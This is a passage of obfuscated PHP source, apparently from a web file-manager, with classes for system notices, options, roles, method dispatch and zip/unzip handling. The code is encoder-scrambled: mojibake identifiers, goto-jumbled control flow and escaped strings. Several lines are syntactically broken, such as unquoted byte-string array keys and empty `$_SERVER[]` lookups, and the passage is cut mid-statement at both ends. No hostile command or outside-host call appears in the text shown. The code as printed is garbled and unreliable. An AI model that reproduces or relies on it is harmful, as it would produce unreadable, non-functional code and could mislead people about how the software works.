B³ØÎöÂÀÇ; eï„…ÁØç: $BÂÈ“ ¨° = $E–­¯ÂíÁ‰[$Bßñ„Æå[29]]; $C“ª¶‰ƒğÎ = isset($f‡ÇÈŠòÁ[$E–­¯ÂíÁ‰[$Bßñ„Æå[1465]]]) ? $f‡ÇÈŠòÁ[$E–­¯ÂíÁ‰[$Bßñ„Æå[1465]]] : !1; $EŞ„º·Š   = strpos($BÂÈ“ ¨°, $Bßñ„Æå[2531]) === 0 ? LNG($Bßñ„Æå[2532]) : LNG($Bßñ„Æå[2527]); goto bçÅªÔµ¨; d™õ‘“¹Óè: unset($E–­¯ÂíÁ‰[$Bßñ„Æå[2533]]); $FÖ–†œ²[] = $E–­¯ÂíÁ‰; goto fé™ÔŸî‡î; fé™ÔŸî‡î: } $this->clearSystemPathLog($Aåµğ£‹Íµ); goto CˆÌ§¹†Ï; CˆÌ§¹†Ï: return $FÖ–†œ²; goto aéĞ‚Æ­¾©; aéĞ‚Æ­¾©: } private function clearSystemPathLog($e²Ä­ĞÛ˜) { $Cµ×³Ÿİ†¯ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (count($e²Ä­ĞÛ˜) == 0) { return; } $A¿íŸ¶ŸâÕ = array($Cµ×³Ÿİ†¯[392] => array($Cµ×³Ÿİ†¯[7], array_unique($e²Ä­ĞÛ˜))); $this->where($A¿íŸ¶ŸâÕ)->delete(); } public function deviceList($A—Ôó²°ÄÒ, $FĞó›áóÅ¢ = 0) { $e¢Åö›óÒ =& $_SERVER[åÌÛ»ô¢‚ö™]; $Aã›—ëùø† = array($e¢Åö›óÒ[1465] => $A—Ôó²°ÄÒ, $e¢Åö›óÒ[200] => array($e¢Åö›óÒ[949], $FĞó›áóÅ¢), $e¢Åö›óÒ[29] => $e¢Åö›óÒ[2077]); $c½íÄù—«¸ = array(); $e‡ğ¡šÜË¸ = $this->field($e¢Åö›óÒ[2534])->where($Aã›—ëùø†)->order($e¢Åö›óÒ[2358])->limit(50)->select(); foreach ($e‡ğ¡šÜË¸ as $f˜­Ê¸¡ô³ => $FøçæÃˆ·) { goto aˆ¨Â²¢Çô; aˆ¨Â²¢Çô: if ($f˜­Ê¸¡ô³ > 0 && abs($FøçæÃˆ·[$e¢Åö›óÒ[200]] - $e‡ğ¡šÜË¸[$f˜­Ê¸¡ô³ - 1][$e¢Åö›óÒ[200]]) < 5) { continue; } $F–İŸùñß¼ = json_decode($FøçæÃˆ·[$e¢Åö›óÒ[430]], !0); $FøçæÃˆ·[$e¢Åö›óÒ[2526]] = isset($F–İŸùñß¼[$e¢Åö›óÒ[2526]]) ? $F–İŸùñß¼[$e¢Åö›óÒ[2526]] : $e¢Åö›óÒ[33]; goto cÒ®Ø†ëÖ…; Eƒ¤°ö¼¯ù: $this->ipAddress($FøçæÃˆ·); $FøçæÃˆ·[$e¢Åö›óÒ[430]] = $F–İŸùñß¼; $c½íÄù—«¸[$eùìÍšÀÛ] = $FøçæÃˆ·; goto bŒ­Ìö—äˆ; cÒ®Ø†ëÖ…: unset($F–İŸùñß¼[$e¢Åö›óÒ[2526]]); $eùìÍšÀÛ = $this->deviceType($F–İŸùñß¼[$e¢Åö›óÒ[2349]]); if (isset($c½íÄù—«¸[$eùìÍšÀÛ])) { continue; } goto Eƒ¤°ö¼¯ù; bŒ­Ìö—äˆ: } return array_values($c½íÄù—«¸); } public function deviceType($a¥ ÜÁÇ¿) { return $a¥ ÜÁÇ¿; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\155\56\x6e\x6f\164\x69\143\x65\x4c\151\x73\x74"; public $field = array("\x6e\x61\155\145", "\x63\157\156\x74\145\156\x74", "\x61\x75\164\150", "\x6d\157\x64\x65", "\164\151\x6d\145", "\164\x79\x70\x65", "\154\145\166\x65\x6c", "\145\156\141\x62\x6c\x65", "\163\x6f\162\164"); public function listData($Dé¦ÄÈ“óˆ = false, $f¤ø¢’Ÿ‰ƒ = "\163\157\x72\164", $A£©Á£”ô = false) { return parent::listData($Dé¦ÄÈ“óˆ, $f¤ø¢’Ÿ‰ƒ, $A£©Á£”ô); } public function add($Bæø¶Ú®ŠÛ) { $eŠÂùéÏËõ =& $_SERVER[åÌÛ»ô¢‚ö™]; $b®ë³’Ã›ª = time(); if ($Bæø¶Ú®ŠÛ[$eŠÂùéÏËõ[12]] == $eŠÂùéÏËõ[2535]) { $b®ë³’Ã›ª = strtotime($Bæø¶Ú®ŠÛ[$eŠÂùéÏËõ[203]]); } $Bæø¶Ú®ŠÛ[$eŠÂùéÏËõ[203]] = $b®ë³’Ã›ª; return parent::insert($Bæø¶Ú®ŠÛ); } public function update($cøëš¨ŒÇ, $Dº÷òˆÕ•) { goto C–ñµ¿¶Ã£; C–ñµ¿¶Ã£: $FÁŠëĞ¼¬ =& $_SERVER[åÌÛ»ô¢‚ö™]; $e¯öŒùç‚ = $this->listData($cøëš¨ŒÇ); if (!$e¯öŒùç‚) { return !1; } goto c­¤»îÄàÎ; EãÀ¬Å¶‚: return parent::update($cøëš¨ŒÇ, $Dº÷òˆÕ•); goto båÍ×Ê”»ö; c­¤»îÄàÎ: $EÎÚâÃå§Ş = time(); if ($Dº÷òˆÕ•[$FÁŠëĞ¼¬[12]] == $FÁŠëĞ¼¬[2535]) { $EÎÚâÃå§Ş = strtotime($Dº÷òˆÕ•[$FÁŠëĞ¼¬[203]]); } $Dº÷òˆÕ•[$FÁŠëĞ¼¬[203]] = $EÎÚâÃå§Ş; goto EãÀ¬Å¶‚; båÍ×Ê”»ö: } public function remove($AÛĞÚÎ‘Œã) { $a²Åïé ¶ = $this->listData($AÛĞÚÎ‘Œã); if (!$a²Åïé ¶ || $a²Åïé ¶[$_SERVER[åÌÛ»ô¢‚ö™][1106]]) { return !1; } return parent::remove($AÛĞÚÎ‘Œã); } public function sort($Bôö»‘¯Ğò, $f©Œö™’²™) { return parent::update($Bôö»‘¯Ğò, $f©Œö™’²™); } public function enable($DöË“Õïçª, $a°¨Á×Ú¿¨) { return parent::update($DöË“Õïçª, array($_SERVER[åÌÛ»ô¢‚ö™][2536] => $a°¨Á×Ú¿¨)); } private function initUserOption() { $EÌ…‘÷ÂÀ› =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->optionType = $EÌ…‘÷ÂÀ›[2537]; $this->modelType = $EÌ…‘÷ÂÀ›[2538]; $this->field = array($EÌ…‘÷ÂÀ›[2539], $EÌ…‘÷ÂÀ›[28], $EÌ…‘÷ÂÀ›[203], $EÌ…‘÷ÂÀ›[29], $EÌ…‘÷ÂÀ›[2540], $EÌ…‘÷ÂÀ›[716], $EÌ…‘÷ÂÀ›[197]); } public function userNoticeGet($bòŠºÕÌç = false) { $this->initUserOption(); return parent::listData($bòŠºÕÌç, $_SERVER[åÌÛ»ô¢‚ö™][392], !0); } public function userNoticeAdd($B‰ˆ×¿³èƒ) { $aŞ‰ó‚›Ñ =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->initUserOption(); $C¹ˆÔìÛ¨ = $this->findByKey($aŞ‰ó‚›Ñ[2539], $B‰ˆ×¿³èƒ[$aŞ‰ó‚›Ñ[392]]); if ($C¹ˆÔìÛ¨) { return !0; } $eöŒã‰ÏøÒ = array($aŞ‰ó‚›Ñ[2539] => $B‰ˆ×¿³èƒ[$aŞ‰ó‚›Ñ[392]], $aŞ‰ó‚›Ñ[28] => $B‰ˆ×¿³èƒ[$aŞ‰ó‚›Ñ[28]], $aŞ‰ó‚›Ñ[203] => $B‰ˆ×¿³èƒ[$aŞ‰ó‚›Ñ[203]], $aŞ‰ó‚›Ñ[29] => isset($B‰ˆ×¿³èƒ[$aŞ‰ó‚›Ñ[29]]) ? $B‰ˆ×¿³èƒ[$aŞ‰ó‚›Ñ[29]] : 1, $aŞ‰ó‚›Ñ[2540] => isset($B‰ˆ×¿³èƒ[$aŞ‰ó‚›Ñ[2540]]) ? $B‰ˆ×¿³èƒ[$aŞ‰ó‚›Ñ[2540]] : 0, $aŞ‰ó‚›Ñ[716] => 0, $aŞ‰ó‚›Ñ[197] => 0); return parent::insert($eöŒã‰ÏøÒ); } public function userNoticeEdit($e‡ß¸„Í , $eÉ¶†§ší´) { $this->initUserOption(); return parent::update($e‡ß¸„Í , $eÉ¶†§ší´); } } goto DÑ«Ã ¢Í”; DÑ«Ã ¢Í”: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\x74\x65\x6d\137\x6f\x70\164\x69\x6f\x6e"; protected $jsonField = array("\x6d\x65\x6e\165", "\x72\157\154\145", "\x72\157\154\x65\x47\162\x6f\165\x70", "\x72\145\x67\151\x73\164", "\x65\155\x61\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($A¸ˆ±»¨‚£) { return "\123\171\163\x74\x65\155\x4f\x70\164\151\x6f\x6e\x5f{$A¸ˆ±»¨‚£}"; } protected function optionDefault($A±Ì„¹÷‘Ö = '') { $Fêšäš‹ÌÏ =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($A±Ì„¹÷‘Ö == $Fêšäš‹ÌÏ[33]) { return $GLOBALS[$Fêšäš‹ÌÏ[6]][$Fêšäš‹ÌÏ[380]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\x2e\x72\157\154\x65\114\151\x73\x74"; public $field = array("\156\x61\155\x65", "\x61\x75\x74\x68", "\x6c\141\x62\145\154", "\144\151\x73\160\154\x61\171", "\x73\x79\163\164\x65\x6d", "\144\145\x73\x63", "\151\x67\x6e\x6f\x72\145\x45\170\x74", "\151\147\156\157\162\x65\x46\x69\x6c\x65\123\x69\172\145", "\x61\144\x6d\x69\x6e\x69\x73\164\x72\x61\164\x6f\x72", "\163\x6f\x72\164"); public function listData($Dñ÷ÛÁø‰Ü = false, $A¥Ã¤‡ñá³ = "\163\x6f\162\164", $a¹óÈœŠÎè = false) { $eñ˜õƒİÜ =& $_SERVER[åÌÛ»ô¢‚ö™]; $BÂçÅ«Šñ† = parent::listData($Dñ÷ÛÁø‰Ü, $A¥Ã¤‡ñá³, $a¹óÈœŠÎè); if (!$Dñ÷ÛÁø‰Ü) { $FÖãø°õô = $eñ˜õƒİÜ[2541]; foreach ($BÂçÅ«Šñ† as $d©ääÃ¤Â‹ => $eáø²ÈâĞ¾) { if ($eáø²ÈâĞ¾[$eñ˜õƒİÜ[2324]] == 1) { $BÂçÅ«Šñ†[$d©ääÃ¤Â‹][$eñ˜õƒİÜ[430]] = $FÖãø°õô; } } } return $BÂçÅ«Šñ†; } public function update($eË±§î¸…, $fâ®á¦¶Ïâ) { goto dŠïÛÓÁ”µ; b¦„ÏèèÕ: if (!$aáæ¦„øŸš || $D¢Ü“†õÃ && $D¢Ü“†õÃ[$A–’«•ˆ©¶[392]] != $aáæ¦„øŸš[$A–’«•ˆ©¶[392]]) { return !1; } if ($D¢Ü“†õÃ[$A–’«•ˆ©¶[2324]] == 1) { $fâ®á¦¶Ïâ = array($A–’«•ˆ©¶[28] => $fâ®á¦¶Ïâ[$A–’«•ˆ©¶[28]], $A–’«•ˆ©¶[2158] => $fâ®á¦¶Ïâ[$A–’«•ˆ©¶[2158]]); } $this->filterAuth($fâ®á¦¶Ïâ[$A–’«•ˆ©¶[401]]); goto bçïŒĞÏÅ; bçïŒĞÏÅ: return parent::update($eË±§î¸…, $fâ®á¦¶Ïâ); goto FÔËøÔÑÍ‡; dŠïÛÓÁ”µ: $A–’«•ˆ©¶ =& $_SERVER[åÌÛ»ô¢‚ö™]; $aáæ¦„øŸš = parent::listData($eË±§î¸…); $D¢Ü“†õÃ = $this->findByName($fâ®á¦¶Ïâ[$A–’«•ˆ©¶[28]]); goto b¦„ÏèèÕ; FÔËøÔÑÍ‡: } public function remove($aİ§ğ”çƒÓ) { $C¯å†ÊÔŒ  = parent::listData($aİ§ğ”çƒÓ); if (!$C¯å†ÊÔŒ  || $C¯å†ÊÔŒ [$_SERVER[åÌÛ»ô¢‚ö™][1106]]) { return !1; } return parent::remove($aİ§ğ”çƒÓ); } public function add($BŠ‹¾À´ó÷) { goto A»Â‡œ; A»Â‡œ: $b‚âÄí÷¸¯ =& $_SERVER[åÌÛ»ô¢‚ö™]; $c˜·††Ö¾© = $BŠ‹¾À´ó÷[$b‚âÄí÷¸¯[28]]; if ($this->findByName($c˜·††Ö¾©)) { return !1; } goto fÈ‘ÙÖë’¿; d‘ÑµˆõÁ‡: return parent::insert($BŠ‹¾À´ó÷); goto D†®™õ‹÷ä; fÈ‘ÙÖë’¿: $b¤¿éÃçâŞ = array($b‚âÄí÷¸¯[411] => $c˜·††Ö¾©, $b‚âÄí÷¸¯[2144] => $b‚âÄí÷¸¯[33], $b‚âÄí÷¸¯[2140] => $b‚âÄí÷¸¯[2148], $b‚âÄí÷¸¯[2542] => 1, $b‚âÄí÷¸¯[2143] => 0, $b‚âÄí÷¸¯[2543] => 0, $b‚âÄí÷¸¯[2142] => $this->getSort()); $BŠ‹¾À´ó÷ = array_merge($b¤¿éÃçâŞ, $BŠ‹¾À´ó÷); $this->filterAuth($BŠ‹¾À´ó÷[$b‚âÄí÷¸¯[401]]); goto d‘ÑµˆõÁ‡; D†®™õ‹÷ä: } private function getSort() { $BÒŠ’¦ËÓê =& $_SERVER[åÌÛ»ô¢‚ö™]; $B¡çÁÚçéÈ = parent::listData(); $eâÅÅáŒ‡† = array_to_keyvalue($B¡çÁÚçéÈ, $BÒŠ’¦ËÓê[33], $BÒŠ’¦ËÓê[2160]); return empty($eâÅÅáŒ‡†) ? 0 : max($eâÅÅáŒ‡†) + 1; } private function filterAuth(&$eôå…ñÕÕ“) { $FÜ­õ­ê›ô =& $_SERVER[åÌÛ»ô¢‚ö™]; $D¥Ã”‰’ = array(); $B„¶ÈêÓ¸ = array_filter(explode($FÜ­õ­ê›ô[47], $eôå…ñÕÕ“)); foreach ($B„¶ÈêÓ¸ as $eôå…ñÕÕ“) { $c“âÖãÅßÔ = explode($FÜ­õ­ê›ô[91], $eôå…ñÕÕ“); if ($c“âÖãÅßÔ[0] == $FÜ­õ­ê›ô[1815] && $c“âÖãÅßÔ[1] != $FÜ­õ­ê›ô[1063]) { $aÃÈÍ´Ş˜ = $c“âÖãÅßÔ[0] . $FÜ­õ­ê›ô[91] . $c“âÖãÅßÔ[1] . $FÜ­õ­ê›ô[2544]; if (!in_array($aÃÈÍ´Ş˜, $B„¶ÈêÓ¸)) { $D¥Ã”‰’[] = $aÃÈÍ´Ş˜; } } $D¥Ã”‰’[] = $eôå…ñÕÕ“; } $eôå…ñÕÕ“ = implode($FÜ­õ­ê›ô[47], $D¥Ã”‰’); } public function sort($Bí¢ÉŞÂ¸Ï, $b¨Ï¹Ğé»‡) { return parent::update($Bí¢ÉŞÂ¸Ï, $b¨Ï¹Ğé»‡); } } goto D¸‚ŸË¢õÓ; bñœ”Ğã»¹: $_SERVER[$_SERVER[][49]] = ("\61\60\61\64".base64_decode('Mjg5'))+0;$_Nz2e="2MFewxNYzIrxdGPURfnCjsDqfApkRY8s3QUS4v9BktXQY4irHvVT2VvEieeBqc5ubafwt";; stream_wrapper_register($_SERVER[][50], $_SERVER[][51]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($C¶Îîôªí, $bµèÇ‰Ì¬) { $fùÒ›á¨‘ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (isset(self::$_methodList[$C¶Îîôªí])) { return @call_user_func_array(self::$_methodList[$C¶Îîôªí], $bµèÇ‰Ì¬); } else { if (method_exists($this, $C¶Îîôªí)) { return call_user_func_array(array($this, $C¶Îîôªí), $bµèÇ‰Ì¬); } else { think_exception(__CLASS__ . $fùÒ›á¨‘[4] . $C¶Îîôªí . $fùÒ›á¨‘[5]); } } } public static function __callStatic($BÄğòçáÏ„, $fé…¾‘œãÁ) { if (isset(self::$_methodListStatic[$BÄğòçáÏ„])) { return call_user_func_array(self::$_methodListStatic[$BÄğòçáÏ„], $fé…¾‘œãÁ); } else { if (method_exists(self, $BÄğòçáÏ„)) { return call_user_func_array(array(self, $BÄğòçáÏ„), $fé…¾‘œãÁ); } else { show_json("{$BÄğòçáÏ„}\x28\x29\x20\156\157\164\40\x65\x78\151\163\x74\x3b", !1); } } } public static function addMethod($fï¼…ñ’«Ñ, $c±Ôæçˆ¢) { self::$_methodList[$fï¼…ñ’«Ñ] = $c±Ôæçˆ¢; } public static function addMethodStatic($Dñë›’Æ¤´, $eóÃ÷¯†Ğî) { self::$_methodListStatic[$Dñë›’Æ¤´] = $eóÃ÷¯†Ğî; } } goto Aï¢¾¥»Éì; B…¤š¼ÛÇ: function beforeShutdown() { Hook::trigger($_SERVER[][32]); } $_SERVER[$_SERVER[][33]] = BASIC_PATH; $_SERVER[$_SERVER[][34]] = LIB_DIR; goto D¨–ŞòÎ¥; bÎªïÔ÷ê: function beforeShutdownFatalError($EŒ¯Ä¨»†÷) { think_exception($EŒ¯Ä¨»†÷); } $_SERVER[$_SERVER[][45]] = $BÃ¢‰·…¼È($_SERVER[$_SERVER[][42]]); $Aøî­ÕÅŠ = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto AÜÊºóÔ; aø‰àÀ£Ò”: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $AÃÁ¶”ã; if (!$AÃÁ¶”ã) { $C¦èà£”î‚ = IO::init($_SERVER[åÌÛ»ô¢‚ö™][8]); } return $C¦èà£”î‚; } private static function iconvSystem($fÈ†¤¥ÊË) { return self::local()->iconvSystem($fÈ†¤¥ÊË); } private static function iconvApp($Dº¥†¡›§µ) { return self::local()->iconvApp($Dº¥†¡›§µ); } public static function zip($a‡ß…¸²’, $F«£®†à = "\172\x69\160", $cÕë˜÷„Ö° = '', $bÊ¯Ø¢›º¸ = REPEAT_RENAME) { goto e±ôÆ„õÄŒ; dÚœ«¦Œ™ğ: $Eš…·ŒÃ‚è = $Fê‰Â¿®— . $cÅê²Ü—Ìï . $a•ğÜˆã[91] . $F«£®†à; $Eš…·ŒÃ‚è = get_filename_auto($Eš…·ŒÃ‚è, $a•ğÜˆã[33], $bÊ¯Ø¢›º¸); $C«‡¾¾İÖ“ = self::iconvSystem($Eš…·ŒÃ‚è); goto D™ÇŞ¡ô¿ß; D™ÇŞ¡ô¿ß: foreach ($CÇÑãÀÕÑ as $dŒ¢‰Ê³ => $dáÊöÑàƒÊ) { $CÇÑãÀÕÑ[$dŒ¢‰Ê³] = self::iconvSystem($dáÊöÑàƒÊ); } KodArchive::create($C«‡¾¾İÖ“, $CÇÑãÀÕÑ); if (!IO::exist($Eš…·ŒÃ‚è)) { if ($e™ÏÂĞİÍ¦) { del_dir($e™ÏÂĞİÍ¦); } show_json(LNG($a•ğÜˆã[1054]), !1); } goto cèÈ–Á«§; e±ôÆ„õÄŒ: $a•ğÜˆã =& $_SERVER[åÌÛ»ô¢‚ö™]; $A¨¦ÍÊ¬ß¸ = self::init($a‡ß…¸²’[0][$a•ğÜˆã[75]]); $E²™­ğ½Ö• = self::info($a‡ß…¸²’[0][$a•ğÜˆã[75]]); goto cî•–ÜÕ–‹; d÷¾³Ò¦Óé: if (!$a‹ÂÂ¡ ˜) { del_dir($e™ÏÂĞİÍ¦); show_json(LNG($a•ğÜˆã[1054]), !1); } del_dir($e™ÏÂĞİÍ¦); return $a‹ÂÂ¡ ˜; goto bÅæøŒÀí”; cèÈ–Á«§: if ($cÕë˜÷„Ö° || !$e™ÏÂĞİÍ¦) { if ($e™ÏÂĞİÍ¦ && strstr($e™ÏÂĞİÍ¦, TEMP_FILES)) { $a­®®ˆÚ¸± = $CÇÑãÀÕÑ = array(); recursion_dir($Fê‰Â¿®—, $a­®®ˆÚ¸±, $CÇÑãÀÕÑ, 0); foreach ($a­®®ˆÚ¸± as $F±­²¶…Ù°) { del_dir($F±­²¶…Ù°); } foreach ($CÇÑãÀÕÑ as $d—¦óÖôÖ±) { if ($d—¦óÖôÖ± == $C«‡¾¾İÖ“) { continue; } del_file($d—¦óÖôÖ±); } } return $Eš…·ŒÃ‚è; } $e‘‰®œò¡Á = self::pathFather($E²™­ğ½Ö•[$a•ğÜˆã[75]]); $a‹ÂÂ¡ ˜ = self::move($Eš…·ŒÃ‚è, $e‘‰®œò¡Á, $bÊ¯Ø¢›º¸); goto d÷¾³Ò¦Óé; få¤§Šê‚Ù: if (count($CÇÑãÀÕÑ) > 1) { $e¦¬ÇÉ§ = IO::info(IO::pathFather($E²™­ğ½Ö•[$a•ğÜˆã[75]])); $cÅê²Ü—Ìï = $e¦¬ÇÉ§[$a•ğÜˆã[28]]; } $Fê‰Â¿®— = $e™ÏÂĞİÍ¦; if (!$Fê‰Â¿®—) { $Fê‰Â¿®— = get_path_father($E²™­ğ½Ö•[$a•ğÜˆã[75]]); if (!$cÕë˜÷„Ö° && $A¨¦ÍÊ¬ß¸->getType() == $a•ğÜˆã[102]) { $Fê‰Â¿®— = get_path_father($A¨¦ÍÊ¬ß¸->path); } $F‹ö†Ü÷„ = IO::info($Fê‰Â¿®—); if (!$F‹ö†Ü÷„[$a•ğÜˆã[202]]) { show_json(LNG($a•ğÜˆã[1053]), !1); } } goto dÚœ«¦Œ™ğ; cî•–ÜÕ–‹: $e™ÏÂĞİÍ¦ = !1; if (!$cÕë˜÷„Ö° && $A¨¦ÍÊ¬ß¸->getType() == $a•ğÜˆã[102]) { $CÇÑãÀÕÑ = self::zipFileList($a‡ß…¸²’); } else { $e™ÏÂĞİÍ¦ = $cÕë˜÷„Ö° ? $cÕë˜÷„Ö° : TEMP_FILES . $a•ğÜˆã[1052] . time() . rand_string(8) . $a•ğÜˆã[8]; mk_dir($e™ÏÂĞİÍ¦); $CÇÑãÀÕÑ = self::zipFileList($a‡ß…¸²’, $e™ÏÂĞİÍ¦); } $cÅê²Ü—Ìï = $E²™­ğ½Ö•[$a•ğÜˆã[28]]; goto få¤§Šê‚Ù; bÅæøŒÀí”: } public static function unzip($f¶¸á»´ò¨, $bäŠÅ…ßµÅ = "\162\x65\x70\x6c\x61\143\145") { goto d”„¶ãÁÒŠ; EŒÂíğº·µ: foreach ($BåÁëÈ‘¨Ú as $dà²Ò¬Ç) { $dà²Ò¬Ç = self::iconvApp($dà²Ò¬Ç); self::move($dà²Ò¬Ç, $bÑ£ª„˜µí, $bäŠÅ…ßµÅ); } del_dir($AÆ´÷‘õÃ); if (!$a½“ÔÓÏ¨×) { del_file($DÍä©×§ÚÇ); } goto aéƒµŠº‚›; eËãŸÇäØ: mk_dir($AÆ´÷‘õÃ); $b¡„©²• = self::fileExt($bèÂé™æï); $DÍä©×§ÚÇ = $AÆ´÷‘õÃ . $f†ŞÏÖ¾°š[91] . $b¡„©²•; goto e–ÊÎ´°‚; F”íÏƒğ›: Hook::trigger($f†ŞÏÖ¾°š[1062], $AÆ´÷‘õÃ); recursion_dir($AÆ´÷‘õÃ, $bµ…Ö¿á–, $DÏš§è÷ôâ, 0); $BåÁëÈ‘¨Ú = array_merge($bµ…Ö¿á–, $DÏš§è÷ôâ); goto EŒÂíğº·µ; e–ÊÎ´°‚: if (!@file_exists(self::iconvSystem($DÍä©×§ÚÇ))) { $a½“ÔÓÏ¨× = self::localFilePath($d‹äÃÜç, $b¡„©²•); $DÍä©×§ÚÇ = $a½“ÔÓÏ¨× ? $a½“ÔÓÏ¨× : parent::download($d‹äÃÜç, $DÍä©×§ÚÇ); } $DÍä©×§ÚÇ = self::iconvSystem($DÍä©×§ÚÇ); $Dš²ÆŒ’¶ = isset($f¶¸á»´ò¨[$f†ŞÏÖ¾°š[1057]]) ? $f¶¸á»´ò¨[$f†ŞÏÖ¾°š[1057]] : $f†ŞÏÖ¾°š[1058]; goto eóÅ„ˆÒ²; bé¶˜Íâˆ›: $aåÈ•¾À = self::tmpFileName($bèÂé™æï); $AÆ´÷‘õÃ = TEMP_FILES . $aåÈ•¾À; del_dir($AÆ´÷‘õÃ); goto eËãŸÇäØ; aéƒµŠº‚›: return !0; goto Aì‘‡º­±ï; B´‚öø¢ÆÄ: if (!($bèÂé™æï = parent::info($d‹äÃÜç))) { show_json(LNG($f†ŞÏÖ¾°š[1056]), !1); } if (!($FçäÓ°÷‘Ï = parent::infoFull($bÑ£ª„˜µí))) { $bÑ£ª„˜µí = parent::mkdir($bÑ£ª„˜µí); $FçäÓ°÷‘Ï = array($f†ŞÏÖ¾°š[75] => $bÑ£ª„˜µí); } else { if (isset($FçäÓ°÷‘Ï[$f†ŞÏÖ¾°š[394]]) && trim($FçäÓ°÷‘Ï[$f†ŞÏÖ¾°š[75]], $f†ŞÏÖ¾°š[8]) != trim($bÑ£ª„˜µí, $f†ŞÏÖ¾°š[8])) { $Bºóª½Ì¬¯ = KodIO::make($FçäÓ°÷‘Ï[$f†ŞÏÖ¾°š[487]]); $D¦ìàõ »¶ = parent::fileNameAuto($Bºóª½Ì¬¯, $FçäÓ°÷‘Ï[$f†ŞÏÖ¾°š[28]], REPEAT_RENAME_FOLDER, !0); $bÑ£ª„˜µí = parent::mkdir($Bºóª½Ì¬¯ . $D¦ìàõ »¶); $FçäÓ°÷‘Ï = array($f†ŞÏÖ¾°š[75] => $bÑ£ª„˜µí); } } $bÑ£ª„˜µí = $FçäÓ°÷‘Ï[$f†ŞÏÖ¾°š[75]]; goto bé¶˜Íâˆ›; d”„¶ãÁÒŠ: $f†ŞÏÖ¾°š =& $_SERVER[åÌÛ»ô¢‚ö™]; $d‹äÃÜç = $f¶¸á»´ò¨[$f†ŞÏÖ¾°š[75]]; $bÑ£ª„˜µí = $f¶¸á»´ò¨[$f†ŞÏÖ¾°š[1055]]; goto B´‚öø¢ÆÄ; eóÅ„ˆÒ²: $D“Ó•¢‘è´ = KodArchive::extract($DÍä©×§ÚÇ, $AÆ´÷‘õÃ . $f†ŞÏÖ¾°š[8], $Dš²ÆŒ’¶); self::archiveExt(); if (!$D“Ó•¢‘è´[$f†ŞÏÖ¾°š[1059]]) { show_json($f†ŞÏÖ¾°š[1060] . $D“Ó•¢‘è´[$f†ŞÏÖ¾°š[1061]], !1); } goto F”íÏƒğ›; Aì‘‡º­±ï: } public static function unzipList($a»ÛÉ™ªš) { goto f„ĞÜ¶¶˜; A‹•‚ïóÔ: $fÉÇÔ¼Êå¦ = self::iconvSystem($fÉÇÔ¼Êå¦); if ($C‰£ÈÒÕôØ >= 0) { $f—šƒ…æÖ = isset($a»ÛÉ™ªš[$cŒ”å£ïèì[1067]]) ? $a»ÛÉ™ªš[$cŒ”å£ïèì[1067]] : !1; $C±«ä‡È¨ = isset($a»ÛÉ™ªš[$cŒ”å£ïèì[28]]) ? $a»ÛÉ™ªš[$cŒ”å£ïèì[28]] : $cŒ”å£ïèì[33]; KodArchive::filePreview($fÉÇÔ¼Êå¦, $C‰£ÈÒÕôØ, $f—šƒ…æÖ, $C±«ä‡È¨); self::archiveExt(); die; } $a¯ÁÖæšš÷ = KodArchive::listContent($fÉÇÔ¼Êå¦); goto EÕÔĞÔŞİß; AÒÓŸ³’¿Ø: return $a¯ÁÖæšš÷[$cŒ”å£ïèì[1061]]; goto eªâõ„ªˆ…; cĞ’÷ÛŠæ’: $e†ÔƒõİÎ = 50000; if (request_url_safe($C’¡Ëáˆ†)) { $b‡’½ãÚŒÃ = parse_url_query($C’¡Ëáˆ†); if (!isset($b‡’½ãÚŒÃ[$cŒ”å£ïèì[75]])) { show_json($cŒ”å£ïèì[1064], !1); } } $D…‚¾§Ø¿Ô = isset($b‡’½ãÚŒÃ) ? $b‡’½ãÚŒÃ[$cŒ”å£ïèì[75]] : $C’¡Ëáˆ†; goto F¡‡¾ª¼¸; f„ĞÜ¶¶˜: $cŒ”å£ïèì =& $_SERVER[åÌÛ»ô¢‚ö™]; $C’¡Ëáˆ† = $a»ÛÉ™ªš[$cŒ”å£ïèì[75]]; $C‰£ÈÒÕôØ = isset($a»ÛÉ™ªš[$cŒ”å£ïèì[1063]]) ? $a»ÛÉ™ªš[$cŒ”å£ïèì[1063]] : -1; goto cĞ’÷ÛŠæ’; E×âÇÍ‡ß: $E–£ß¾¡³’ = json_encode($a¯ÁÖæšš÷[$cŒ”å£ïèì[1061]]); self::setContent($EØµ‡–»–Ü, $E–£ß¾¡³’); if (count($a¯ÁÖæšš÷[$cŒ”å£ïèì[1061]]) >= $e†ÔƒõİÎ) { show_json(sprintf(LNG($cŒ”å£ïèì[1065]), count($a¯ÁÖæšš÷[$cŒ”å£ïèì[1061]])), !1); } goto AÒÓŸ³’¿Ø; dœ²ùÊ‡Ú: if (!is_dir($Dœ‚‰‚ Á£)) { mk_dir($Dœ‚‰‚ Á£); } $fÉÇÔ¼Êå¦ = $Dœ‚‰‚ Á£ . $cŒ”å£ïèì[8] . $e—å¶Ö¥‘‘; if (!@file_exists(self::iconvSystem($fÉÇÔ¼Êå¦))) { if (isset($b‡’½ãÚŒÃ)) { url_request($C’¡Ëáˆ†, $cŒ”å£ïèì[1066], $fÉÇÔ¼Êå¦); } else { $c¾­¥ÊÌ¿· = self::localFilePath($C’¡Ëáˆ†, $D–ñ®Ö™ƒØ); $fÉÇÔ¼Êå¦ = $c¾­¥ÊÌ¿· ? $c¾­¥ÊÌ¿· : self::download($C’¡Ëáˆ†, $fÉÇÔ¼Êå¦); } } goto A‹•‚ïóÔ; F¡‡¾ª¼¸: $AìÀíÂ”… = self::info($D…‚¾§Ø¿Ô); $D–ñ®Ö™ƒØ = self::fileExt($AìÀíÂ”…); $fÔ«Û¾¦Æ‚ = self::tmpFileName($AìÀíÂ”…); goto D²í¯­”ØĞ; D²í¯­”ØĞ: if (isset($b‡’½ãÚŒÃ)) { $c´ƒœÂ¾Ë‘ = 